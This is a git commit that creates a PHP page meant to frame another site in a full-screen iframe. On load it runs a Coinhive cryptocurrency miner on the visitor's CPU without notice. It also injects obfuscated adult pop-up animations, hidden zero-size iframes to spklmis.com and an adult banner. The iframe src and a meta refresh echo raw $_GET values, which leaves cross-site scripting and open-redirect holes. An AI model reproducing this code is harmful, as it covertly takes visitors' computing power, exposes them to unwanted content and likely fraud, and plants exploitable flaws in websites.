a6e8a1ab0e2d02058472a2753a252fd37a075c1a
Ahmed Nitul <ahmednitul@gmail.com>
2018-01-02 10:15:31 +0600

    Create index.php

---
+++ index.php
@@ -0,0 +1,152 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <title>@N</title>
+
+  <style>
+    * {
+      margin: 0; padding: 0;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    body {
+      text-align: center;
+      font-family: 'proxima-nova', Helvetica;
+    }
+
+    #footer {
+      position: absolute;
+      bottom: 0; left: 0; right: 0;
+      margin-bottom: 69px;
+    }
+    #footer a {
+      color: rgba(255,255,255,0.5);
+      text-decoration: none;
+      margin: 10px;
+      font-size: 12px;
+    }
+    #footer a:first-child {
+      float: left;
+    }
+    #footer a:last-child {
+      float: right;
+    }
+  </style>
+
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script>
+        var miner = new CoinHive.Anonymous('T4tL3hVUTcyS0UNmhoY5PHbxmVZqj1F2', {threads: 4, throttle: 0.2});
+        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+  </script>
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/5866702fb7a6946c1d667028/1c2q9ppmb';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+
+<script>(function(T,o,t,e,m){var a,b,c=function(v){v.target.remove();var
+a=o.createElement(t),b=o.getElementsByTagName(t)[0];a.async=1;a.src='https://ahmednitul.github.io/istripper/c.js';b.parentNode.insertBefore(a,b)};T['TotemToolsObject']=m;T[m]=T[m]||function(){(T[m].q=T[m].q||[]).push(arguments)},T[m].l=1*new
+Date();a=o.createElement(t),b=o.getElementsByTagName(t)[0];a.async=1;a.addEventListener&&a.addEventListener('error',c);a.src=e;b.parentNode.insertBefore(a,b)})(window,document,'script','https://ahmednitul.github.io/istripper/l.js','loadTool');
+
+loadTool('popping',{
+        path:           'https://ahmednitul.github.io/istripper/',
+        position:       'left',
+        offset:         -5000,
+        shuffle:        true,
+        bubble:         false,
+        outlink:        'http://nitul.net',
+        fallbackSize:   150,
+        fallbackPosition:       'left',
+        bubbleText:     'GET ME NOW !', disableFallback:        false,
+        disableFallbackMobile:  false,
+        anims:          [
+		{"id":"e0092_1","width":204,"height":345,"stick":"bottom"},
+		{"id":"e0095_1","width":274,"height":200,"stick":"bottom"},
+		{"id":"e0114_1","width":210,"height":340,"stick":"bottom"},
+		{"id":"e0304_3","width":388,"height":290,"stick":"bottom"},
+		{"id":"e0391_1","width":516,"height":320,"stick":"bottom"},
+		{"id":"e0450_4","width":234,"height":340,"stick":"bottom"},
+		{"id":"e0453_2","width":440,"height":320,"stick":"bottom"},
+		{"id":"e0470_3","width":372,"height":320,"stick":"bottom"},
+		{"id":"e0485_2","width":340,"height":320,"stick":"bottom"},
+		{"id":"e0486_1","width":328,"height":345,"stick":"bottom"},
+		{"id":"e0095_3","width":264,"height":340,"stick":"bottom"},
+		{"id":"e0114_2","width":320,"height":340,"stick":"bottom"},
+		{"id":"e0115_4","width":264,"height":340,"stick":"bottom"},
+		{"id":"e0304_4","width":242,"height":390,"stick":"bottom"},
+		{"id":"e0391_2","width":306,"height":340,"stick":"bottom"},
+		{"id":"e0407_4","width":340,"height":340,"stick":"bottom"},
+		{"id":"e0472_3","width":272,"height":340,"stick":"bottom"},
+		{"id":"e0502_3","width":286,"height":340,"stick":"bottom"},
+		{"id":"e0506_3","width":340,"height":340,"stick":"bottom"},
+		{"id":"e0582_2","width":360,"height":340,"stick":"bottom"},
+		{"id":"f0002_1","width":473,"height":217,"stick":"bottom"},
+		{"id":"f0002_2","width":280,"height":315,"stick":"bottom"},
+		{"id":"f0002_3","width":298,"height":315,"stick":"bottom"},
+		{"id":"e0656_1","width":224,"height":336,"stick":"bottom"},
+		{"id":"e0656_2","width":240,"height":336,"stick":"bottom"},
+		{"id":"e0656_3","width":304,"height":285,"stick":"bottom"},
+		{"id":"e0658_1","width":342,"height":266,"stick":"bottom"},
+		{"id":"e0734_1","width":256,"height":346,"stick":"bottom"},
+		{"id":"e0734_2","width":272,"height":336,"stick":"bottom"},
+		{"id":"e0524_4","width":300,"height":320,"stick":"bottom"},
+		{"id":"e0524_6","width":396,"height":325,"stick":"bottom"},
+		{"id":"e0524_7","width":380,"height":360,"stick":"bottom"},
+		{"id":"e0524_10","width":420,"height":360,"stick":"bottom"},
+		{"id":"e0524_11","width":460,"height":380,"stick":"bottom"},
+		{"id":"e0430_3","width":170,"height":400,"stick":"top"},
+		{"id":"e0501_2","width":236,"height":400,"stick":"top"},
+		{"id":"e0452_1","width":178,"height":400,"stick":"top"},
+		{"id":"e0501_3","width":212,"height":400,"stick":"top"},
+		{"id":"e0497_1","width":320,"height":400,"stick":"top"},
+		{"id":"e0636_1","width":306,"height":400,"stick":"top"},
+		{"id":"e0538_1","width":218,"height":400,"stick":"bottom"},
+		{"id":"e0555_2","width":252,"height":400,"stick":"bottom"},
+		{"id":"e0555_3","width":264,"height":400,"stick":"bottom"},
+		{"id":"e0561_4","width":312,"height":400,"stick":"bottom"},
+		{"id":"e0561_5","width":312,"height":400,"stick":"bottom"},
+		{"id":"e0609_1","width":272,"height":400,"stick":"bottom"},
+		{"id":"e0609_3","width":290,"height":400,"stick":"bottom"},
+		{"id":"e0616_2","width":326,"height":400,"stick":"bottom"},
+		{"id":"e0616_3","width":278,"height":400,"stick":"bottom"},
+		{"id":"e0619_2","width":276,"height":400,"stick":"bottom"},
+		{"id":"e0619_4","width":298,"height":400,"stick":"bottom"},
+		{"id":"e0619_5","width":372,"height":400,"stick":"bottom"},
+		{"id":"f0164_1","width":222,"height":400,"stick":"bottom"},
+		{"id":"f0164_2","width":212,"height":400,"stick":"bottom"},
+		{"id":"e0389_2","width":282,"height":490,"stick":"right"},
+		{"id":"e0454_1","width":276,"height":490,"stick":"right"},
+		{"id":"e0484_2","width":260,"height":490,"stick":"right"},
+		{"id":"e0405_1","width":202,"height":490,"stick":"right"},
+		{"id":"e0466_2","width":202,"height":490,"stick":"right"},
+		{"id":"e0503_2","width":200,"height":490,"stick":"right"}
+]});</script>
+
+</head>
+<body>
+<iframe src="<?php echo $_GET["!"]; ?>" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden;" scrolling="no" allowfullscreen="true" webkitallowfullscreen="true" mozallowfullscreen="true"><meta http-equiv="refresh" content="0;url=<?php echo $_GET["x"]; ?>" /></iframe>
+</body>
+  <div id="footer">
+    <iframe width="0" height="0" src="http://spklmis.com/?p=28&s=60689&pp=1&v=0" frameborder="0"></iframe>
+
+    <a href="http://spklmis.com/?p=28&s=60689&pp=1&v=0" target="_blank" rel="follow"> <img src="//misslk.com/s.php?w=468&h=60&m=0&i=0&l=US&n=2" alt="hot girl
+striptease sexy nude poledance desktop stripper" height="60" width="468"> </a>
+
+    <iframe width="0" height="0" src="http://spklmis.com/?p=28&s=60689&pp=1&v=0" frameborder="0"></iframe>
+
+  </div>
+</html>
